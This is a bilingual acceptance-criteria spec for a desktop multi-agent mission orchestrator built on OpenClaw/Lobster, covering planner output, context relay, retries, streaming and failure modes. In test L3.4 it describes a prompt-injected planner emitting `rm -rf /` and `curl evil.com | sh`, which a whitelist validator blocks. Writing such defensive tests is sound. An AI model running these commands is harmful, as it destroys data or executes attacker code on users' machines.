# 03 · Acceptance — 验收标准（Lobster-first 加强版）

> **更新日期**：2026-04-17（加强 Lobster 集成测试覆盖）
> **格式**：Given / When / Then，对应 L1-L5 五层测试金字塔
> **前置阅读**：[01-DESIGN.md](./01-DESIGN.md) · [02-FILE-LAYOUT.md](./02-FILE-LAYOUT.md) · [06-RESEARCH.md](./06-RESEARCH.md)
> **用户强制要求**："尽量用已有的 OpenClaw ... 但要充分测试"

## Stage 1 验收

### Journey 1 · Planner 拆解 + 文件持久化

- **Given** 用户在 Agents 页面有至少一个配置好模型的 agent（默认 main）
- **And** `~/.awarenessclaw/missions/` 目录不存在或为空
- **When** 用户在 Task Center 点 "Start New Mission"，输入目标 "Make a TODO list app with React"，点 "Start"
- **Then** 界面出现一个 kanban board 显示 3-8 个 step
- **And** `~/.awarenessclaw/missions/<id>/mission.json` 存在
- **And** `~/.awarenessclaw/missions/<id>/plan.md` 存在且包含 Planner 输出
- **And** `mission.json` 的 `steps[].depends_on` 形成合法 DAG（无环，所有依赖存在）
- **And** 每个 step 的 `agentId` 都是 agent list 中真实存在的 id
- **Assert**: `test/e2e/user-journeys/team-task-planner.spec.mjs`

### Journey 2 · Step 间 context 真传递

- **Given** Journey 1 执行完成（plan 已生成，5 个 step 在队列中）
- **When** T1 跑完，进入 T2
- **Then** T2 的 Gateway spawn prompt（从 `logs/T2-run.log` 取）**必须包含 T1 的 artifact 内容**（具体：至少包含 T1 的 "For the next agent" 段落的 80% 字符）
- **And** T2 的 prompt 必须包含 `MEMORY.md` 当前内容
- **And** T2 的 prompt 必须包含 `<PastExperience>` 块（即便 awareness_recall 返回空也要有空块）
- **Assert**: `test/e2e/user-journeys/team-task-context-relay.spec.mjs`

### Journey 3 · Step 完成后文件回写

- **Given** T1 正在 running
- **When** T1 的 agent 在 Gateway 发出 `lifecycle phase=end` 事件
- **Then** `artifacts/T1-<slug>.md` 文件存在且非空
- **And** 文件 YAML frontmatter 包含 `stepId: T1`、`agentId`、`createdAt`、`durationSeconds`
- **And** `MEMORY.md` 文件 size 比 T1 开始前大（append 了一段）
- **And** `mission.json` 的 `steps[T1].status === "done"` 且 `completedAt` 非空
- **Assert**: `test/e2e/user-journeys/team-task-step-done.spec.mjs`

### Journey 4 · App 重启 mission 可见（S1 最小版）

- **Given** Journey 1 执行完（mission 已创建，可能还在 running）
- **When** 用户关闭 OCT-Agent 并重新启动
- **Then** Task Center 页面**能看到这个 mission 的卡片**（不管是 running / paused / failed）
- **And** 点开能看到 plan / steps / 已完成的 artifacts
- **Note**: S1 不保证能 "继续跑"（那是 S2），但必须 "看得到历史"
- **Assert**: `test/e2e/user-journeys/team-task-survive-restart.spec.mjs`

### Journey 5 · Kanban 状态随真实事件更新（非 setTimeout 假装）

- **Given** T1 正在 running
- **When** Gateway 发出 `lifecycle start` 事件
- **Then** Kanban 卡片从 "waiting" 列移到 "running" 列（1s 内）
- **When** Gateway 发出 `lifecycle end` 事件
- **Then** Kanban 卡片移到 "done" 列（1s 内）
- **Negative assertion**: 如果 Gateway WS 断开（mock 成超时），卡片**不应该**自己变 done（避免假装成功）
- **Assert**: `test/e2e/user-journeys/team-task-kanban-sync.spec.mjs`

### Journey 10 · Streaming UX（用户强制要求）

- **Given** mission 已 approve 并启动
- **When** Planner 开始生成 plan
- **Then** Plan Preview 区域**立即开始显示** token（不是等全部完成才一次性出现）
- **And** 第一个 token 在 **3s 内**可见
- **And** tokens 以 **肉眼可见的速度**追加（类似 ChatGPT 输出节奏）

- **When** 进入某个 step 执行
- **Then** 该 Kanban 卡片可展开，展开后**实时显示 agent 输出的 stdout stream**
- **And** tool 调用（例如 `exec: pnpm install`）以 inline chip 形式显示 → "📖 exec: pnpm install..." 进度 → 完成后变成 "✅ exec completed"
- **And** 如果用户手动滚动卡片向上看历史 token，**自动滚动暂停**；用户滚到底才恢复自动跟随

- **When** 某个 step 产生很多 delta（100+ tokens/sec）
- **Then** UI 渲染不卡顿（FPS ≥ 30）
- **And** token 按 200ms 节流合批（见 streaming-bridge.ts）

- **Assert**: `test/e2e/user-journeys/team-task-streaming-ux.spec.mjs`

## Stage 2 验收

### Journey 6 · 关 app 任务继续跑

- **Given** mission 正在 T2 running
- **When** 用户关闭 Electron app（非 Runner daemon）
- **And** 等待 2 分钟
- **Then** `~/.awarenessclaw/missions/<id>/HEARTBEAT.md` 的 `Last beat` 时间**仍在持续更新**（说明 daemon 还活着）
- **And** `logs/T2-run.log` 继续追加新事件
- **When** 用户重新打开 app
- **Then** Task Center 页面显示 T2 的实时状态（可能已进入 T3）
- **Assert**: `test/e2e/user-journeys/team-task-app-close-continue.spec.mjs`

### Journey 7 · Runner crash 后 resume

- **Given** mission 正在 T3 running
- **When** Runner daemon 进程被 kill -9
- **And** Electron app 重新启动（或用户手动点 "Resume"）
- **Then** 检测到 HEARTBEAT 超过 2 分钟未更新 → 标 T3 为 "interrupted"
- **And** 允许用户选择 "Retry T3" / "Skip T3" / "Abort mission"
- **Assert**: `test/e2e/user-journeys/team-task-runner-crash-resume.spec.mjs`

## Stage 3 验收

### Journey 8 · 三级重试自动生效

- **Given** T2 第一次执行失败（network_error）
- **When** Runner 自动触发重试
- **Then** 第 2 次 spawn 的 prompt 包含 `<RetryContext>` 段，含错误摘要
- **When** 第 2 次也失败
- **Then** 第 3 次用另一个同 role 的 agent（如果有）
- **When** 第 3 次也失败
- **Then** `step.status === "failed"`，`mission.status === "paused_awaiting_human"`
- **And**（S3+）通过配置的 channel（feishu / telegram）收到通知消息
- **Assert**: `test/e2e/user-journeys/team-task-retry-escalate.spec.mjs`

### Journey 9 · Awareness memory 真注入

- **Given** 用户 6 个月前跑过一个 mission "Make a blog app"，awareness_record 保存了 "用 Next.js App Router 时要避免 'use client' 滥用" 的教训
- **When** 这次启动 mission "Make a TODO list app with Next.js"
- **Then** Planner 的 prompt 中 `<PastExperience>` 段包含那条教训
- **And** plan.md 中的 subtask 设计考虑了这条教训（具体断言：title 或 deliverable 中包含 "use client" / "server component" 等相关关键词）
- **Assert**: `test/e2e/user-journeys/team-task-memory-inject.spec.mjs`

## Failure Modes（L3 集成测试）

### Failure 1 · Planner 返回非法 JSON

- **If** Planner agent 输出 `This is a plan: ...` 而非严格 JSON
- **Then** Orchestrator 提示用户 "Planner output invalid, please try with a stronger model"
- **And** `mission.status === "failed"`，`mission.steps === []`
- **And** 不 crash 主进程
- **Assert**: `test/integration/mission-planner-invalid-output.test.ts`

### Failure 2 · Subtask 引用不存在的 agent

- **If** Planner 输出 `{ "agentId": "non-existent" }`
- **Then** Orchestrator 在生成 queue 时检测，自动 fallback 到 main agent
- **And** `mission.json` 记录 `fallbackReason: "agent non-existent not found"`
- **Assert**: `test/integration/mission-planner-bad-agent.test.ts`

### Failure 3 · Depends_on 成环

- **If** Planner 输出 T1 depends T2, T2 depends T1
- **Then** Orchestrator 检测到环 → 拒绝 plan，要求重新规划
- **Assert**: `test/integration/mission-plan-cycle-detect.test.ts`

### Failure 4 · 文件系统写失败（磁盘满）

- **If** 写 `mission.json` 或 `artifacts/T{n}.md` 返回 ENOSPC
- **Then** mission 转 `failed`，UI 显示 "磁盘空间不足，请清理后重试"
- **And** 已跑完的 step 的 artifacts 不丢失（不做 rollback）
- **Assert**: `test/integration/mission-disk-full.test.ts`

### Failure 5 · Gateway WS 断开

- **If** spawn 后 60s 内没收到任何 Gateway 事件
- **Then** 重连 WS 一次
- **If** 仍然失败 → `step.status = "failed"`，`errorCode = "network_error"`
- **Assert**: `test/integration/mission-gateway-disconnect.test.ts`

### Failure 6 · 两个 app 实例抢 mission（S2+）

- **If** 两个 Electron app 同时启动，同时想 resume 同一个 mission
- **Then** 只有一个 app 抢到 `orchestrator.pid` 锁并开始跑
- **Then** 另一个 app 显示 "Mission is being handled by another instance"，mission 只能读不能改
- **Assert**: `test/integration/mission-concurrent-runner.test.ts`

### Failure 7 · HEARTBEAT 在 running 中断（agent 卡死）

- **If** step 进入 running 后，5 分钟内 HEARTBEAT 没更新（但 Runner 进程还活着）
- **Then** Orchestrator 视为 agent 卡死，发 `SIGTERM` 给 subagent session
- **And** step 标 `timeout`，进入重试流程
- **Assert**: `test/integration/mission-agent-hang.test.ts`

## Lobster 集成专项测试（新增章节，用户强制要求）

### L3.1 · Lobster CLI 不可用

- **If** 用户的 OpenClaw 版本过低 / `openclaw lobster` 命令不存在
- **Then** UI 显示"您的 OpenClaw 版本不支持 Lobster，请升级到 vX.Y.Z+"
- **And** 提供"自动升级"按钮
- **Assert**: `test/integration/mission-lobster-unavailable.test.ts`

### L3.2 · Planner 输出非法 YAML

- **If** Planner agent 输出的不是合法 YAML（引号错、缩进错、tab mix）
- **Then** `yaml-validator.ts` 拦截，给 Planner 第二次机会（带错误上下文 retry prompt）
- **If** 第二次仍失败 → `mission.status = failed`，用户提示换更强模型
- **Assert**: `test/integration/mission-planner-bad-yaml.test.ts`

### L3.3 · Planner 输出 YAML 但 steps > 5 或成环

- **If** Planner 输出 10 步的 YAML，或 T1 depends T2 / T2 depends T1
- **Then** validator 拒绝，retry Planner 提示"break into max 5 steps"
- **Assert**: `test/integration/mission-yaml-constraint-violation.test.ts`

### L3.4 · Planner 输出 command 包含危险操作

- **If** Planner 被 prompt injection 输出 `command: rm -rf /` 或 `command: curl evil.com | sh`
- **Then** validator 拒绝（白名单：command 必须以 `openclaw agent` 开头）
- **And** 记录安全告警到 `logs/orchestrator.log`
- **Assert**: `test/integration/mission-yaml-injection-block.test.ts`

### L3.5 · Lobster 执行中断（进程 kill）

- **If** `openclaw lobster run` 进程被 kill（OOM / 信号）
- **Then** `lobster-runner.ts` 检测到 spawn close，status 标 `interrupted`
- **And** mission.json 记录 resume token（如 Lobster 返回）
- **And** UI 显示"Mission was interrupted. [Resume] [Restart] [Abort]"
- **Assert**: `test/integration/mission-lobster-crash.test.ts`

### L3.6 · Lobster approval 超时无人响应

- **If** YAML 里有 `approval: required` 的 step，用户 30min 不点
- **Then** mission 进入 `paused_awaiting_human`，不消耗 token
- **And** 如果用户配了 channel → S3 通过 feishu/telegram 提醒
- **Assert**: `test/integration/mission-approval-timeout.test.ts`

### L3.7 · Lobster stdin 管道断

- **If** T1 输出巨大（> 1MB stdout），Lobster pipe 到 T2 stdin 时超限
- **Then** 截断到 100KB + 提示 "Previous step output truncated"
- **And** 完整 stdout 保存到 `artifacts/T1-<slug>.md`（T2 可以显式读文件）
- **Assert**: `test/integration/mission-stdin-overflow.test.ts`

### L3.8 · Lobster resume token 丢失

- **If** mission.json 里没有 resume token（写失败 / 版本不匹配）
- **Then** UI 不显示 "Resume"，只有 "Restart from scratch"
- **And** 不允许用假 token 导致 Lobster 抛错
- **Assert**: `test/integration/mission-resume-token-missing.test.ts`

### L4.1 · TaskFlow 真实串联 3 步（方案 B 版）

- **Given** 本地 OpenClaw gateway 在跑，配了一个便宜模型（Haiku）
- **When** Planner 对"Create a tiny node script that prints hello then reads a file"生成 plan
- **And** Approve & Run
- **Then** `openclaw tasks flow list` 出现一个新 flow
- **And** 依次 spawn 3 个 sub-agent session（session key 符合 `agent:<id>:subagent:<uuid>` 格式）
- **And** T2 的 spawn prompt 真实包含 T1 artifact 的"Handoff"段
- **And** T3 的 spawn prompt 真实包含 T2 artifact 的"Handoff"段
- **And** 3 个 artifact 文件都写到 `~/.awarenessclaw/missions/<id>/artifacts/`
- **Assert**: `test/e2e/user-journeys/team-task-real-taskflow-3step.spec.mjs`

---

## Streaming 专项 L3 Failure Modes（用户硬要求加强）

### L3.9 · WS 断开后自动重连

- **If** Mission 正在 running（某 step 在 streaming），Gateway WS 突然断开
- **Then** `streaming-bridge.ts` 1s 后自动 reconnect，继续订阅同 sessionKey
- **And** UI 显示一个短暂的"reconnecting..."小提示（不刷屏）
- **And** 重连成功后 stream 继续（**不会丢已看到的 token**，但新 token 补齐）
- **Assert**: `test/integration/mission-stream-reconnect.test.ts`

### L3.10 · WS 长时间断开（> 60s）

- **If** WS 断开 60s 仍未恢复
- **Then** 当前 step 标 `lost`（对应 OpenClaw tasks 的 `lost` 状态）
- **And** UI 显示 "Connection lost. [Retry] [Abort mission]"
- **And** 不假装 step 成功
- **Assert**: `test/integration/mission-stream-long-disconnect.test.ts`

### L3.11 · Delta 事件乱序

- **If** Gateway 发送的 delta 事件 timestamp 乱序（[t=3, t=1, t=2]）
- **Then** UI 按 timestamp 重排，而非按到达顺序显示
- **Or** 丢弃 < lastRenderedTimestamp 的 delta（根据实现策略）
- **Assert**: `test/integration/mission-stream-out-of-order.test.ts`

### L3.12 · Delta 速率爆炸（token bomb）

- **If** agent 输出速率 > 100 tokens/sec
- **Then** `streaming-bridge.ts` 按 200ms 节流合批（≤ 5 次/秒 IPC）
- **And** 前端 FPS ≥ 30（不卡顿）
- **Assert**: `test/perf/mission-stream-throttle.perf.test.ts`

### L3.13 · Tool call start 无对应 end（orphan）

- **If** event:tool `state=start` 后 5 分钟无 `state=end`
- **Then** 卡片上该 tool chip 标 "⚠️ orphan"（不是转圈永不结束）
- **Assert**: `test/integration/mission-stream-orphan-tool.test.ts`

---

## L1 Static Guards（加强版）

- [ ] `verify-buttons.mjs`：Task Center 所有 onClick 都有对应 IPC handler
- [ ] `verify-endpoints.mjs`：新 IPC channel 全部在 `channel-registry.ts` 声明
- [ ] `verify-mission-schema.mjs`：`mission.json` schema 版本号递增时必须有 migration 函数
- [ ] **`verify-lobster-yaml-schema.mjs`（新）**：Planner prompt 模板产出 smoke test，走 validator 100% 通过
- [ ] **`verify-ipc-types.mjs`（新）**：`register-mission-handlers.ts` 的 channel 名 + payload type 前后端一致
- [ ] `verify-shared-scripts.sh`：不适用于此 feature

## L5 Mutation Testing（用户强制要求）

- [ ] Stryker 对以下文件跑 mutation：
  - `packages/desktop/electron/mission/yaml-validator.ts`（核心安全守卫，必须强）
  - `packages/desktop/electron/mission/planner-prompt.ts`（Planner 生成逻辑）
  - `packages/desktop/electron/mission/awareness-bridge.ts`（memory 注入逻辑）
  - `packages/desktop/electron/mission/lobster-runner.ts`（事件解析 + resume）
- [ ] Target mutation score ≥ 80%
- [ ] 每季度跑一次（不在 CI 每次跑，太慢）

## Definition of Done（S1 合并清单，Lobster-first 加强版）

### L1 · Static
- [ ] 5 个 verify-*.mjs 脚本全部通过
- [ ] TypeScript `tsc --noEmit` 全绿（不引入新错误）
- [ ] Planner prompt 模板能产出通过 validator 的 YAML（smoke test）

### L2 · Integration
- [ ] ≥ 50 integration tests 通过
- [ ] 所有 mission/* 模块单测 + 组合测

### L3 · Failure Mode（含 Lobster 专项 + Streaming 专项）
- [ ] Failure 1-5（原有）通过
- [ ] **L3.1-L3.8（TaskFlow 专项，8 项）** 全部通过（注：L3.1-L3.8 原本是 Lobster 专项，方案 B 下部分改为 TaskFlow 专项，详见章节）
- [ ] **L3.9-L3.13（Streaming 专项，5 项，用户硬要求）** 全部通过

### L4 · User Journey E2E
- [ ] Journey 1-5（原有）通过
- [ ] **Journey 10（Streaming UX）** 通过
- [ ] **L4.1（真实 TaskFlow 串联）** 通过

### L5 · Mutation
- [ ] Stryker 覆盖 4 个核心文件，mutation score ≥ 80%

### 手动验证
- [ ] 本地跑过一个 "Make a TODO list app with React" 端到端 demo，artifacts/ 产出 ≥ 3 个 markdown
- [ ] Lobster resume：中途 kill Lobster 进程 → 重启 app → 能从中断处继续（或至少显示可 Restart 按钮）
- [ ] 用一个非程序员（或模拟）走过 Dashboard → Mission 全流程，能看懂每一步

### 文档 + 发布
- [ ] CHANGELOG 写"用户看到什么变化"（不是 "fix X"）
- [ ] [05-TASKS.md](./05-TASKS.md) S1 所有 task 打 ✅
- [ ] [README.md](./README.md) Stage 进度表更新
- [ ] DMG 打包能过（不破坏现有发布流程）

## 下一步

- 读 [04-STAGES.md](./04-STAGES.md) 看分阶段实施
- 读 [05-TASKS.md](./05-TASKS.md) 看具体 task 清单
